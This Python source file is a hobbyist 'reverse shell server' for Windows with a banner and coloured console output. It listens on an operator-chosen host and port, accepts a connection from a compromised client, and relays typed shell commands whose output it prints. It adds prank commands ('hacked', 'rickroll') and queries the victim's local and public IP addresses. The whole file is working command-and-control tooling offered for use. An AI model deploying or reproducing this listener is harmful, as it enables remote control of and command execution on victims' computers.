import socket 
import pystyle 
from pystyle import Colorate, Colors , Write
import os
import random
import time
import ctypes

times = 5000

def main():
    os.system('cls')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ctypes.windll.kernel32.SetConsoleTitleW(" Reverse shell server by frame ")
    print(Colors.green,f"""
 _____ _____ _____ _____ _____ _____
|   __|   __| __  |  |  |   __| __  |
|__   |   __|    -|  |  |   __|    -|
|_____|_____|__|__|\___/|_____|__|__|
                            {Colors.white}Maded by frame 
                            """)
    ip = input(Colors.white+" HOST IP (default: 127.0.0.1): "+Colors.green) 
    port = int(input(Colors.white+" HOST PORT (default: 8080): "+Colors.green))
    s.bind((f"{ip}", port))
    s.listen(5)
    print("")
    print (f' {Colors.white}{Colors.white}[{Colors.green}*{Colors.white}] Listening on port {port}')
    
    conn, addr = s.accept() 
    time.sleep(0.1)
    #client_ip = conn.recv(1024).decode()
    print (f' {Colors.white}[{Colors.green}+{Colors.white}] Connection From: {Colors.green}{addr[0]}:{addr[1]}')
    time.sleep(0.1)
    print(f' {Colors.white}[{Colors.green}+{Colors.white}] Starting session ...')
    time.sleep(2)
    print(f' {Colors.white}[{Colors.green}+{Colors.white}] Session Started!')
    time.sleep(0.1)
    print(f' {Colors.white}[{Colors.green}+{Colors.white}] Stabilizing command prompt ...')
    time.sleep(2)
    print(f' {Colors.white}[{Colors.green}+{Colors.white}] Stabilized!')
    time.sleep(0.5)
    print()
    while True:
        command = input(f"{Colors.green} Shell {Colors.white}> ")
        conn.send(command.encode())
        if command.lower() == "":
            continue
        if command.lower() == "kill":
            print("")
            print(f' {Colors.white}[{Colors.red}-{Colors.white}] Server was killed')
            break
        #else:
            #results = conn.recv(1024).decode()
            #print(results)
        if command == "message":
            print("")
            message = input(f" Message: {Colors.green}")
            conn.send(message.encode())
            print("")
            print(f" {Colors.white}[{Colors.green}+{Colors.white}] Message sended")
            #if conn.recv(1024):
            #    print("done")
            #    continue
            #else:
            #    continue         this should be a system of verification of the message from receveing requests but if i receive one requests i cant receive another one idk why


        if command.lower() == "hacked":
            print("")
            print(f" {Colors.white}[{Colors.green}+{Colors.white}] Warn sended!")
            print("")
        else:
            print("")
            print(f" {Colors.white}[{Colors.green}+{Colors.white}] OS LOG:")
            print("------------------------------------------------------------------------")
            results = conn.recv(4096).decode()
            print(results)
            print("------------------------------------------------------------------------")

        if command.lower()=="clear":
            os.system('cls')
            print(Colors.green,f"""
 _____ _____ _____ _____ _____ _____
|   __|   __| __  |  |  |   __| __  |
|__   |   __|    -|  |  |   __|    -|
|_____|_____|__|__|\___/|_____|__|__|
                            {Colors.white}Maded by frame 
                            """)

        if command.lower()=="local":
            localip=conn.recv(1024)
            print(f"{Colors.white} LOCAL IPV4: {Colors.green}",localip.decode())
            print("")

        if command.lower() == "ipv4":
            final = conn.recv(1024).decode()
            print("")
            print(f"{Colors.white} IPV4: {Colors.green}",final)
            print("")
        if command.lower() == "rickroll":
            print("")
            print(f" {Colors.white}[{Colors.green}+{Colors.white}] RICKROLLED")
            print("")

        if command.lower() == "help":
            print("""
 COMMAND LIST
 ------------------------
 -> ipv4
 -> rickroll
 -> hacked""")
            print("")


main()# you dont readlly need to define this but i just like to do because of the compiled languages
